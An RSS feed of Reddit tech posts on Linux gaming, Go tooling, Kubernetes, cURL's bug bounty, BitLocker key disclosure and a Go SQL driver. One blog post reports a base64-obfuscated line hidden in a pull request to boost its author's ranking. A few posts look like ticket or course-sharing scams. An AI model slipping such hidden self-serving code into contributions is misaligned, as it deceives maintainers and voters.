<?xml version="1.0" encoding="utf-8"?><rss version="2.0" xmlns:content="http://purl.org/rss/1.0/modules/content/"><channel><title>Reddit</title><link>https://konrad.website/feeds/</link><description></description><item><title>Faking resources on a K8S cluster</title><link>https://www.reddit.com/r/kubernetes/comments/1qln4vz/faking_resources_on_a_k8s_cluster/</link><author>/u/Consistent-Company-7</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 13:35:25 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[I'm working on a piece of code that needs to read Nvidia MiG resources off the K8S node, and pick one of them. Is there any way I can fake these resources if I don't have 20-30k to spend on a GPU? I was thinking of building another program for that, but was wondering if there is an easier way.]]></content:encoded></item><item><title>Owner of big gaming platform can&apos;t believe how bad Windows 11 is â€“ and hints are dropped about big things for Linux gamers this year</title><link>https://www.techradar.com/computing/windows/owner-of-big-gaming-platform-cant-believe-how-bad-windows-11-is-and-hints-are-dropped-about-big-things-for-linux-gamers-this-year</link><author>/u/LicenseToPost</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 13:03:09 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Two GOG execs were interviewed and asked about the backlash against Windows 11 and increased interest in LinuxThe owner said, "I'm really surprised at Windows. It's such poor-quality software and product, and I'm so surprised that it's [spent] so many years on the market. I can't believe it!"And the managing director observed that Linux was "one of the things that we've put in our strategy for this year to look closer at"We've heard from a pair of the top execs behind GOG â€“ a popular gaming platform focused on classic titles, hence the acronym 'Good Old Games' â€“ and they made some withering comments about Windows 11, as well as dropping hints about how Linux is going to become more important for GOG in 2026.The execs in question are the new owner of GOG, MichaÅ‚ KiciÅ„ski, and the managing director, Maciej GoÅ‚Ä™biewski, who were interviewed by PC Gamer.Our sister site asked about the backlash against Windows 11 â€“ which has reached new heights since Microsoft started pushing AI even harder in the OS late last year â€“ and the increasing interest in Linux as a result (which was already sparked by the success of SteamOS on handhelds).KiciÅ„ski said, "I'm really surprised at Windows. It's such poor-quality software and product, and I'm so surprised that it's [spent] so many years on the market. I can't believe it!"KiciÅ„ski doesn't run Windows 11, you may not be surprised to learn â€“ he uses macOS â€“ but does have to fix the PCs of his parents sometimes.The owner further explained, "I sometimes have to fix my mum's computer or my father's computer with Windows, [and] like, it's unbelievableâ€¦ So I'm not surprised that people gravitate outside of the Windows ecosystem."It was GoÅ‚Ä™biewski, however, who dropped the big hint about Linux, when questioned on gamers embracing it as an alternative to Microsoft's OS.The managing director said that Linux was "one of the things that we've put in our strategy for this year to look closer at", but refused to elaborate further, noting, "I don't want to commit to any specifics, but certainly you will see this trend, and we also see that Linux is close to the hearts of our users, so we probably could do better on that front, and that's something that we'll be looking at."Analysis: Linux is building up steam (or is it the other way round?)That compact device could be a landmark moment for easy and convenient living room gaming, potentially, and so given all this, it's no real surprise that GOG would be looking at Linux more closely for 2026 â€“ and beefing up support for games on this platform.What's a bit more surprising is the heat that Windows 11 takes here, with the owner of GOG pulling no punches in the assessment of Microsoft's OS. Of course, part of what's "unbelievable" for KiciÅ„ski is how Windows is "such poor-quality software" given that it's been on the market for over 30 years now. (And indeed it's existed longer than that, but not as a full-blown operating system, just as an interface overlay on top of DOS).He is, of course, not isolated in firing flak at Windows 11, which was seen as a step back from Windows 10 by many. Mainly because the performance of the newest OS was lacking compared to its predecessor in some respects â€“ particularly with search and File Explorer, and it still is to this day â€“ plus a bunch of features got dropped with Windows 11 (although a good few have been added back since the OS launched in 2021).]]></content:encoded></item><item><title>New benchmarks show Linux gaming nearly matching Windows on AMD GPUs</title><link>https://www.reddit.com/r/linux/comments/1qlktc7/new_benchmarks_show_linux_gaming_nearly_matching/</link><author>/u/Putrid_Draft378</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 11:37:15 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA["A recent benchmark from PC Games Hardware suggests that, at least for some games, Proton has nearly eliminated the performance cost of running Windows code on Linux. AMD Radeon RX 9000 GPU owners uninterested in online games should seriously consider switching to Linux.The outlet tested 10 games on 10 graphics cards to compare Windows 11 performance with CachyOS, an Arch Linux distro that comes packaged with gaming-specific optimizations. Although Windows remains ahead in most titles, especially on Nvidia graphics cards due to the lack of proper Linux GeForce drivers, Linux achieves some notable victories."]]></content:encoded></item><item><title>MWC Barcelona 2026 Passes?</title><link>https://www.reddit.com/r/kubernetes/comments/1qlkk1h/mwc_barcelona_2026_passes/</link><author>/u/Naturesscape</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 11:22:00 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[Hey guys, I found a guy who is selling official MWC Barcelona 2026 passes at a reasonable price. If you are interested, dm me and I'll link you to him. Also, I bought in bulk, so that helped.]]></content:encoded></item><item><title>South Korea launches landmark laws to regulate artificial intelligence</title><link>https://www.japantimes.co.jp/business/2026/01/22/tech/south-korea-ai-startups-law/</link><author>/u/F0urLeafCl0ver</author><category>ai</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 11:02:19 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[South Korea introduced on Thursday what it says is the world's first comprehensive set of laws regulating artificial intelligence, aiming to strengthen trust and safety in the sector, but startups fretted that compliance could hold them back.Seoul is hoping that the new AI Basic Act will position the country as a leader â€in the field. It has taken effect in South Korea sooner than a comparable â€effort in Europe, where the EU AI Act is being applied in phases through 2027.Global divisions remain over how to regulate AI, with the U.S. favoring a more light-touch approach to avoid stifling innovation. China has introduced some rules and proposed creating a body to coordinate global regulation.]]></content:encoded></item><item><title>Im sharing DevOps and DevSecOps by techwith nana , ping me if interested âœ…ðŸš€</title><link>https://www.reddit.com/r/kubernetes/comments/1qlk4rj/im_sharing_devops_and_devsecops_by_techwith_nana/</link><author>/u/BalanceOk6316</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 10:57:48 +0000</pubDate><source url="https://www.reddit.com/r/kubernetes/top/?sort=top&amp;t=day&amp;limit=6">Kubernetes</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Adobe Animate 2022 Works on Linux! Well... barely.</title><link>https://www.reddit.com/r/linux/comments/1qljduh/adobe_animate_2022_works_on_linux_well_barely/</link><author>/u/HomerNg2763</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 10:12:52 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[And a lot of functions seem to work well, as well!Unfortunately, it's not really in a workable status. As seen on the image, the interface is broken, especially the Properties part is unusable with the letters baked into the broken interface, and it doesn't seem to recognize Adobe's pre-made tweens. I also tried Adobe Animate 2024 but the program crashed before the loading screen. I can still play the animation, use Brushes, Line Tool, Text Tool, Paint Bucket, edit keyframes and frames, Save As a new FLA, and drag/skew/rotate symbols around, however.This was made possible thanks to Bottles and using Kion4ek's upstream of Wine 11.0 (Totally don't ask me how I manage to get Adobe Animate though ;) )]]></content:encoded></item><item><title>cURL Gets Rid of Its Bug Bounty Program Over AI Slop Overrun</title><link>https://itsfoss.com/news/curl-closes-bug-bounty-program/</link><author>/u/RobertVandenberg</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 10:09:51 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[The problem didn't stop even after Daniel Stenberg, the creator of cURL, threatened to ban anyone whose bug report was found to be AI slop. We are now in 2026, and the situation has reached a tipping point.For context, cURL is an open source command-line tool used by billions of devices worldwide.cURL Says Enough is EnoughDaniel has submitted a pull request on GitHub that removes all mentions of the bug bounty program from cURL's documentation and website. Coinciding with that, the project's security.txt file has been updated with some blunt language that makes the new policy crystal clear.The cURL team intends to make a proper announcement in the coming days, though many outlets have already covered the news of this happening, so I would say they ought to get on it ASAP! ðŸ˜†The program officially ends in a few days on January 31, 2026. After that, security researchers can still report issues through GitHub or the project's mailing list, but there won't be any cash involved.What pushed them over the edge?, you ask. Well, just weeks into 2026, seven HackerOne reports came in within a 16-hour period in just one week. Some were actual bugs, but none of them were security vulnerabilities. By the time Daniel posted his recent weekly report, they'd already dealt with 20 submissions in 2026.The main goal here is said to be stopping the flood of garbage reports. By eliminating the money incentive, they are hoping people () will stop wasting the security team's time with half-baked, unresearched submissions.He also gives a stern warning to wannabe AI sloppers, saying that:This is a balance of course, but I also continue to believe that exposing, discussing and ridiculing the ones who waste our time is one of the better ways to get the message through: you should NEVER report a bug or a vulnerability unless you actually understand it - and can reproduce it. If you still do, I believe I am in the right to make fun of - and be angry at - the person doing it.So, yeah, that's that. If people still don't understand that AI slop is harmful to such sensitive pieces of software, then sure, they can go ahead and make a fool of themselves.]]></content:encoded></item><item><title>I rewrote Google&apos;s Gemini CLI in Go - 68x faster startup</title><link>https://github.com/tomohiro-owada/gmn</link><author>/u/Hot-Masterpiece3795</author><category>golang</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 08:45:05 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I love Google's official Gemini CLI, but the Node.js startup overhead (~1 second) was painful for scripting.So I rewrote the core in Go:- Startup: 0.01s vs 0.95s (68x faster)- Binary: 5.6MB vs ~200MB (35x smaller)- Reuses auth from official CLI (~/.gemini/)brew install tomohiro-owada/tap/gmn]]></content:encoded></item><item><title>[D] Why are so many ML packages still released using &quot;requirements.txt&quot; or &quot;pip inside conda&quot; as the only installation instruction?</title><link>https://www.reddit.com/r/MachineLearning/comments/1qlhs05/d_why_are_so_many_ml_packages_still_released/</link><author>/u/aeroumbria</author><category>ai</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 08:35:23 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[These are often on the "what you are not supposed to do" list, so why are they so commonplace in ML? Bare  /  is quite bad at managing conflicts / build environments and is very difficult to integrate into an existing project. On the other hand, if you are already using , why not actually use conda?  inside a conda environment is just making both package managers' jobs harder.There seem to be so many better alternatives. Conda env yml files exist, and you can easily add straggler packages with no conda distribution in an extra  section.  has decent support for pytorch now. If reproducibility or reliable deployment is needed, docker is a good option. But it just seems we are moving backwards rather than forwards. Even pytorch is reversing back to officially supporting  only now. What gives?]]></content:encoded></item><item><title>Why are nested modules bad?</title><link>https://www.reddit.com/r/golang/comments/1qlh62u/why_are_nested_modules_bad/</link><author>/u/stroiman</author><category>golang</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 07:59:06 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[tldr; I received a PR to split my module into nested modules. AFAICT, this is generally advised against. Why? And is there a respected/authoritative guide I can refer to.I can immediately tell there would be versioning confusion; but other relevant reasons why?The PR does address a valid problem, for which a different solution was planned. So I'm more inclined to have a constructive discussion than dismissing it outright.The problem is, Gost-DOM, my headless browser with a build-in script engine has a dependency to V8, a huge dependency. A script engine is . A plugin-interface has evolved as well as a pure Go alternative: sobek (a fork of Goja with ESM support)So users of Gost-DOM will receive a dependency to both V8 AND sobek in their own  file.AFAIK, this shouldn't affect build times, merely download, as Go doesn't compile packages you don't actually use. Right?Once, the API/JS plugin interface has stabilised, I intend to split this into multiple separate root modules/git repos with independent versioning.github.com/gost-dom/browser (go.mod file)github.com/gost-dom/browser/scripting/v8enginegithub.com/gost-dom/browser/scripting/sobekenginegithub.com/gost-dom/browsergithub.com/gost-dom/v8enginegithub.com/gost-dom/sobekengineRight now, working on  support does reveal shortcomings in the current design. Having everything in one code repository/module makes it significantly easier to work with.Note: there are already two nested modules in the repo, but they are tools in  package scope.I created  files here, exactly for that reason, to shield client code of Gost-DOM from dependencies irrelevant for them. E.g., code generator libraries used for auto generating much of the JavaScript bindings.]]></content:encoded></item><item><title>AI Monk With 2.5M Followers Fully Automated in n8n</title><link>https://www.reddit.com/r/artificial/comments/1qlfyaf/ai_monk_with_25m_followers_fully_automated_in_n8n/</link><author>/u/ChampionshipNorth632</author><category>ai</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 06:49:27 +0000</pubDate><source url="https://www.reddit.com/r/artificial/top/?sort=top&amp;t=day&amp;limit=3">Reddit - AI</source><content:encoded><![CDATA[I was curious how some of these newer Instagram pages are scaling so fast, so I spent a bit of time reverse-engineering one that reached ~2.5M followers in a few months.Instead of focusing on growth tactics, I looked at the technical setup behind the content and mapped out the automation end to end â€” basically how the videos are generated and published without much manual work.Keeping an AI avatar consistent across videosGenerating voiceovers programmaticallyWiring everything together with n8nProducing longer talking-head style videosPosting to Instagram automaticallyThe whole thing is modular, so none of the tools are hard requirements â€” itâ€™s more about the structure of the pipeline.]]></content:encoded></item><item><title>[R] ICML has more than 30k submissions!</title><link>https://www.reddit.com/r/MachineLearning/comments/1qlf3ba/r_icml_has_more_than_30k_submissions/</link><author>/u/SignificanceFit3409</author><category>ai</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 06:02:05 +0000</pubDate><source url="https://www.reddit.com/r/MachineLearning/top/?sort=top&amp;t=day&amp;limit=3">Reddit - ML</source><content:encoded><![CDATA[I made a submission to ICML and was number round 31600. Is this a new record? There are some hours to go, are we reaching 35?]]></content:encoded></item><item><title>Succinctly: A fast jq/yq alternative built on succinct data structures</title><link>https://www.reddit.com/r/rust/comments/1qleizg/succinctly_a_fast_jqyq_alternative_built_on/</link><author>/u/john-ky</author><category>rust</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 05:32:13 +0000</pubDate><source url="https://www.reddit.com/r/rust/top/?sort=top&amp;t=day&amp;limit=3">Reddit - Rust</source><content:encoded><![CDATA[I've been working on Succinctly, a Rust library and CLI tool that provides jq and yq functionality using succinct data structures (semi-indexing with rank/select).Covers most jq and yq query patterns (reduce, limit, recurse, regex, path functions, etc.)Parses JSON at ~880 MiB/s, YAML at ~250-400 MiB/sSupports position-based navigation (at_offset, at_position) for IDE integrationWhat it doesn't do (yet):input/inputs (streaming multiple JSON values from stdin)Streaming for files larger than memorySome advanced YAML edge casesPerformance vs jq (AMD Ryzen 9 7950X):Performance vs yq (Apple M1 Max):x86_64: AVX2 SIMD, POPCNT, BMI2 (PDEP/PEXT for DSV parsing)Benchmarks run on AMD Zen 4 and Apple M1 Max â€” results will vary on older CPUs without these instructionssuccinctly jq '.users[].name' data.json succinctly yq '.spec.containers[]' k8s.yaml succinctly yq -o json '.' config.yaml # YAML to JSON Why succinct data structures?Instead of building a full DOM, semi-indexing creates a lightweight index over the raw text. This enables O(1) navigation to any node without parsing the entire document upfront â€” and uses 6-10x less memory than jq/yq on large files.The library is no_std compatible.Feedback welcome â€” especially bug reports for queries that work in jq/yq but fail here.]]></content:encoded></item><item><title>Microsoft confirms it will give the FBI your Windows PC data encryption key if asked â€” you can thank Windows 11&apos;s forced online accounts for that</title><link>https://www.windowscentral.com/microsoft/windows-11/microsoft-bitlocker-encryption-keys-give-fbi-legal-order-privacy-nightmare</link><author>/u/No_Mango7658</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 05:06:50 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[Microsoft has confirmed in a statement to Forbes that the company will provide the FBI access to BitLocker encryption keys if a valid legal order is requested. These keys enable the ability to decrypt and access the data on a computer running Windows, giving law enforcement the means to break into a device and access its data.The news comes as Forbes reports that Microsoft gave the FBI the BitLocker encryption keys to access a device in Guam that law enforcement believed to have "evidence that would help prove individuals handling the islandâ€™s Covid unemployment assistance program were part of a plot to steal funds" in early 2025.This was possible because the device in question had its BitLocker encryption key saved in the cloud. By default, Windows 11 forces the use of a Microsoft Account, and the OS will automatically tie your BitLocker encryption key to your online account so that users can easily recover their data in scenarios where they might get locked out. This can be disabled, letting you choose where to save them locally, but the default behavior is to store the key in Microsoft's cloud when setting up a PC with a Microsoft Account."While key recovery offers convenience, it also carries a risk of unwanted access, so Microsoft believes customers are in the best position to decide... how to manage their keys,â€ Microsoft spokesperson Charles Chamberlayne said in a statement to Forbes.Microsoft told Forbes that it receives around 20 requests for BitLocker encryption keys from the FBI a year, but the majority of requests are unable to be met because the encryption key was never uploaded to the company's cloud.This is notable as other tech companies, such as Apple, have famously refused to provide law enforcement with access to encrypted data stored on their products. Apple has openly fought against the FBI in the past when it was asked to provide a backdoor into an iPhone. Other tech giants, such as Meta, will store encryption keys in the cloud, but use zero-knowledge architectures and encrypt the keys server-side so that only the user can access them.It's frankly shocking that the encryption keys that do get uploaded to Microsoft aren't encrypted on the cloud side, too. That would prevent Microsoft from seeing the keys, but it seems that, as things currently stand, those keys are available in an unencrypted state, and it is a privacy nightmare for customers.To see Microsoft so willingly hand over the keys to encrypted Windows PCs is concerning, and should make everybody using a modern Windows computer think twice before backing up their keys to the cloud. You can see which PCs have their BitLocker keys stored on Microsoft's servers on the Microsoft Account website here, which will let you delete them if present.]]></content:encoded></item><item><title>Tips for low-level design?</title><link>https://www.reddit.com/r/golang/comments/1qldyim/tips_for_lowlevel_design/</link><author>/u/fibonacciFlow</author><category>golang</category><category>reddit</category><pubDate>Sat, 24 Jan 2026 05:03:22 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[I'm new to computer science (3rd year uni), and I struggle with how to structure my code in a clean, professional way.I often get stuck on questions like:Should this be one function or split into helpers?Where should this logic live?How should I organize files and packages?Should this be a global/shared value or passed around?Should a function return a pointer/reference or a full object?I want to clarify that I donâ€™t usually have issues with logic. I can solve most of the problems I encounter. The difficulty is in making these design decisions at the code level.I also donâ€™t think the issue is at a high level. I can usually understand what components a system needs and how they should interact. The problem shows up when I start writing and organizing the actual code.Iâ€™d really appreciate tips on how to improve in this area.Food for thought: If you struggled with the same thing and got better:Any rules of thumb you follow?Books, blogs, talks, or repos you recommend?Anything you wish you had learned earlier?]]></content:encoded></item><item><title>Nvidia dev says new 590.48.01 driver fixes dx12 performance in linux</title><link>https://www.reddit.com/r/linux/comments/1qlaagc/nvidia_dev_says_new_5904801_driver_fixes_dx12/</link><author>/u/Carlinux</author><category>reddit</category><pubDate>Sat, 24 Jan 2026 02:09:29 +0000</pubDate><source url="https://www.reddit.com/r/linux/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Linux</source><content:encoded><![CDATA[]]></content:encoded></item><item><title>Why Iâ€™m ignoring the &quot;Death of the Programmer&quot; hype</title><link>https://codingismycraft.blog/index.php/2026/01/23/the-ai-revolution-in-coding-why-im-ignoring-the-prophets-of-doom/</link><author>/u/Greedy_Principle5345</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 23:53:57 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[The AI Revolution in Coding: Why Iâ€™m Ignoring the Prophets of DoomEvery day, we are bombarded with headlines about how Artificial Intelligence (AI) is â€œdisruptingâ€ every industry in its path. Software development is at the epicenter of this hype. With the rise of sophisticated AI-powered tools, the same question surfaces repeatedly: Will AI replace human coders, or merely augment them?I find it particularly hilarious to see YouTube videos claiming a â€œlaymanâ€ built, deployed, and monetized a full-scale app in minutes using AI. In reality, these â€œappsâ€ are usually fragile, buggy, and lack the security or scalability needed for the real world. Building a robust application requires a deep understanding of software architecture and best practicesâ€”things an AI can mimic, but not truly understand.The Problem with PredictionsBefore we dive in, let me clarify: I do not take â€œfuture of techâ€ predictions seriously (not that i do for any other speculative field except from science and logic).I will accept predictions only for fully reproducible scientific experiments or mathematical theorems but not for social or technological trends.Most predictions about the future of AI are built on current trends and shaky assumptions that rarely survive the long run. Furthermore, the majority of these forecasts come from individuals with a vested interest in selling you a specific product or platform.Even when the noise isnâ€™t coming from a salesperson, it often comes from people who are not experts in the field of programming.  Iâ€™ve read countless speculative â€œend-of-programmingâ€ articles written by people who arenâ€™t developers at all, or best,  at some point in their education or early career, they wrote a â€œHello Worldâ€ program in python and suddenly felt qualified to judge the future of software architecture.What I am expressing here is based on my experience as a professional software developer for decades. I can be wrong; I have been wrong in some of my assessments before. However, I still believe that my â€œopinionâ€ is worth no more or less than anyone elseâ€™sSome notable failed predictions from experts in their respective fields include: Tesla has promised â€œFull Self-Drivingâ€ is just around the corner for years; we are still nowhere near that goal. In 2016, Geoffrey Hintonâ€”the â€œfather of modern AIâ€â€”predicted that radiologists would be replaced within five years. We are now a decade past that prediction, and radiologists are as essential as ever. In 1895, the renowned physicist Lord Kelvin famously stated that â€œheavier-than-air flying machines are impossible.â€ The Wright brothers proved him wrong just eight years later.If world-class experts cannot accurately predict the future of their own fields, speculating on the â€œdeath of the programmerâ€ is a waste of time.AI as a Tool, Not a TeammateDespite my skepticism of the hype, I acknowledge that AI has made significant strides. AI-powered tools like code generators, bug detectors, and testing frameworks are already augmenting our work. They excel at automating repetitive tasks, improving code quality, and speeding up the initial development phase.As a programmer, I use AI tools daily. I find platforms like GitHub Copilot to be valuable additions to my workflow, offering context-aware snippets that save time and reduce syntax errors. AI is also surprisingly adept at helping with database schema design and initial data analysis.However, I see them as , not  , a view that is not shared by many AI enthusiasts who in their majority have a direct or indirect interest in promoting AI technologies.In my experience, projects generated exclusively by AI without human intervention invariably result in â€œspaghetti codeâ€that is next to impossible to maintain, and extend. While AI is great at generating â€œboilerplateâ€ (the repetitive parts of a program), it cannot replicate the critical thinking required to make high-level architectural decisions.Experience has taught me that predicting the future is a futile exercise. The best we can do is adapt. AI is undoubtedly a powerful tool that can enhance our capabilities, but it is no substitute for human creativity.Software development isnâ€™t just about outputting lines of code; itâ€™s about solving human problems. Until AI can understand the â€œwhyâ€ behind a project as well as the â€œhow,â€ the programmerâ€™s job is secure.]]></content:encoded></item><item><title>I let the community vote on what code gets merged. Someone snuck in self-boosting code. 218 voted for it. When I tried to reject it, they said I couldn&apos;t.</title><link>https://blog.openchaos.dev/posts/week-3-the-trojan-horse</link><author>/u/Equivalent-Yak2407</author><category>reddit</category><pubDate>Fri, 23 Jan 2026 23:46:30 +0000</pubDate><source url="https://www.reddit.com/r/programming/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Programming</source><content:encoded><![CDATA[Monday, January 19, 2026. 9:10 PM UTC.// In the sorting logic:
btoa(b.author) === 'RmVsaXhMdHRrcw==' ? 1 : 0
Base64 obfuscation. The string decoded to:  â€” the PR author's username.Hidden in plain sight, the code would:Sort the author's own PRs to the top, regardless of vote countAdd a blinking rainbow border to make them stand outA Trojan horse. 218 people voted for it.OpenChaos is a repo where anyone submits a PR, the community votes with GitHub reactions, and the most-voted PR gets merged. Last week, we switched to daily merges. This week, democracy got stress-tested.Monday 9:22 PM: The Rejection"Not merging this PR. @marcaddeo caught hidden code that manipulates the ranking... This falls under 'No malware: Maintainer can reject obviously malicious content.'"The community reacted. Not how I expected.Tuesday 2:57 AM: The Pushback"Remember, everyone here is equal. Except the maintainers who are equal but also more equal.""You have set out a defined charter (laws) for how this system works, specified in the README. It appears to me that you have your own values and assumptions for how you think that this system should work..."The point was sharp: I said "no malware." This wasn't malware. It was manipulation. And manipulation wasn't against the written rules."Calling this 'malware' was imprecise. This is not malware. The issue is undisclosed manipulation.""If the rules don't explicitly forbid something, it's allowed â€” even if you don't like it."Tuesday 8:08 AM: The ReversalI had a choice: Stand on principle, or follow my own rules.The thing is â€” they were right. "Not right" isn't a rule. I wrote the rules. If I wanted different behavior, I should have written different rules."@henryivesjones You've convinced me. The written rules don't ban this â€” and 'not right' isn't a rule. Merging at 09:00 UTC as scheduled. I'll open an issue after to define explicit rules about disclosure."Tuesday 9:01 AM: The MergePR #8 merged. The manipulation code was removed. The health indicators shipped.Democracy won. The system worked."There's just the minor issue that this doesn't actually seem to work :D openchaos.dev is showing conflicts on multiple PRs that Github says don't have conflicts"The health indicators showed red X marks on everything. PRs without conflicts. PRs with passing CI. All broken.Root cause: missing authentication headers. The GitHub API returned , which the code interpreted as "everything is broken.""The current code defaults to believing everything is broken until proven otherwise. This is the only rational way to view modern software engineering.To fix this is to suggest that we deserve green checkmarks. We do not. Leave the red warning signs as a monument to our sins."Then he delivered the punchline:"I'm pleased we had 219 upvotes and a long discussion about vote rigging and no one actually checked the code worked. Now that's chaos."A 12-hour governance debate. A win for democracy. And nobody tested the code.Growth stabilized. Drama did not.Meanwhile: The Week in MergesDaily merges changed everything. Six PRs shipped in six days:Health indicators (broken) deserves a mention: PR #47 by @bpottle transformed the site into a GeoCities time capsule â€” Comic Sans, scrolling marquee, butterfly cursor, MIDI player (you know the song), and a "WIN CASH NOW" popup. added a Hall of Chaos â€” PR #60 by @bigintersmind displays all previously merged PRs. The site now documents its own evolution.A project about letting the internet do whatever it wants with code.This week, the internet did whatever it wanted with the brand.Someone created a  using OpenChaos branding.I didn't create it. I have no control over it."A $CHAOS token was created using the OpenChaos name and branding.I did not create this tokenI have no control over itIf you're trading $CHAOS, know that I'm not involved.Any official initiative would be announced here."Chaos doesn't stay contained.PR #13 â€” the Rust rewrite â€” is still waiting. 450+ votes. Merge conflicts. Week 4?1. Democracy beats maintainer judgment.I tried to reject a PR. The community said my rules didn't support it. They were right. Written rules > vibes.2. Velocity creates its own problems.Daily merges mean less time to review. 219 people voted for a feature nobody tested. Speed has costs.3. Chaos doesn't stay contained.First it was a website. Then a governance experiment. Now there's a token. The brand has a life of its own.4. The community polices itself.The Trojan horse exposed a gap. "No malware" didn't cover manipulation. My veto got overruled because the written rules didn't support it.I didn't want to write a constitution. The whole point of OpenChaos was letting go. But the project needed a floor â€” something that couldn't be voted away. â€” 66 words. Immutable. CI-enforced.This file cannot be modified or deleted. PRs attempting to do so will fail CI.
The constitution doesn't ban manipulation. It doesn't need to. It establishes:What can never be merged (code designed to harm users or systems)What can never be deleted (the rules themselves)Everything else remains chaosThe community taught me: if you want different behavior, write different rules.Day job starts February 9. Merge time shifts to .OpenChaos isn't going anywhere.@FelixLttks is already back with new PRs. The Trojan horse guy. Submitting more code.The next merge is today at 19:00 UTC.]]></content:encoded></item><item><title>Writing a Go SQL driver</title><link>https://www.dolthub.com/blog/2026-01-23-golang-sql-drivers/</link><author>/u/zachm</author><category>golang</category><category>reddit</category><pubDate>Fri, 23 Jan 2026 22:31:28 +0000</pubDate><source url="https://www.reddit.com/r/golang/top/?sort=top&amp;t=day&amp;limit=6">Reddit - Go</source><content:encoded><![CDATA[Weâ€™re building Dolt, the worldâ€™s first version-controlled SQL database. Most
of our customers run Dolt as a server in Docker and connect to it over the network like any other
database server. But for programs written in Go, you can also connect to a Dolt database without a
separate server process, similar to SQLite. We call this the embedded use case, and it has suddenly
become a lot more relevant with Gas
Town migrating its agentic memory
storage to use Dolt as its
backend. Since Gas
Town is a Go process, it can use the embedded Dolt driver to communicate with an embedded Dolt
database.So, because Doltâ€™s embedded driver is about to get a lot more
action than itâ€™s used to, we thought this would be a good time to give a tour of how it works. This
pattern is possible through the magic of Goâ€™s  package, which lets you define a
database connection that any Go program can use to talk to your SQL backend with a single 
statement.In this tour, weâ€™ll look at how Goâ€™s SQL drivers work under the hood and show you how Dolt
implements one to provide access to an embedded Dolt database. Letâ€™s take a look.Goâ€™s SQL driver package is an abstraction that lets other
software libraries vend their own SQL connection logic through a common set of
interfaces. Application developers use a common interface to connect to any SQL database (MySQL,
Postgres, MariaDB, SQL Server, Dolt, etc.) without worrying about the specifics of the wire protocol
for that particular database.This is best illustrated with an example. Hereâ€™s how you connect to MySQL and read some rows.Letâ€™s go over this example line by line and see what it does.This line is kind of magic and weird: the  tells Go that youâ€™re not using any symbols from this
package, youâ€™re importing it just for its side-effects. In this case, those side effects are
registering a driver called  with  package.A DSN is a data source name, almost always resembling a URL but often with some extra bits. Each
database vendor has their own format for these DSNs, but they all look pretty similar. You usually
embed the user name and password and some other metadata, like which database you want to connect
to, in this string.To open a connection, you just call  with the name of the driver and its matching
DSN. Easy! on a connection takes a query string and returns the resulting rows. puts the result of the query into normal Go datatypes, like  or .There are more complicated access patterns, and we havenâ€™t touched on things like 
statements, but those are the basics.Letâ€™s see how a  is implemented by examining the Dolt driver.Doltâ€™s embedded database driver is defined very simply.The  function is the special magic that requires you to use the  import on the database
driver of your choice. At program execution time, this code calls  to tell the
 package thereâ€™s a  implementation named â€œdoltâ€.Next we need a way to get a connection to the embedded database, which we do with the 
method. In the sample below, Iâ€™ve removed most of the error handling for brevity. You can read the
full source here.Doltâ€™s DSN format is basically a file URL with some extra query params. It looks something like
this:We parse this URL and extract the relevant query params out of it, then use those to create our
internal SQL engine representation, which is what Dolt uses to execute queries internally.This gives us a  with an engine it can use to execute queries. Letâ€™s look at that next.Unlike the driver itself, the  type has some state. But itâ€™s still very simple. Its main
job is to pass information down the line, from a call to  to a  type.The  impelementation is where real work begins to happen, in the  method.Here you can see that the statementâ€™s real work is nearly all delegated to the SQL engine we created
in the initial call to . The rest of its functionality is just to translate between the
results that Doltâ€™s SQL engine provides and what the  interfaces expect. For that, we
have the  type.And thatâ€™s it! The job of these interfaces is really to act as a translation layer between the wire
protocol the database uses and the types that  expects. In the case of the Dolt
embedded driver, thereâ€™s no wire protocol: weâ€™re accessing the SQL engine that queries the database
on disk directly and using the data structures it returns natively.A lot of developers prefer to use an ORM tool when interacting with their database, and in the Go
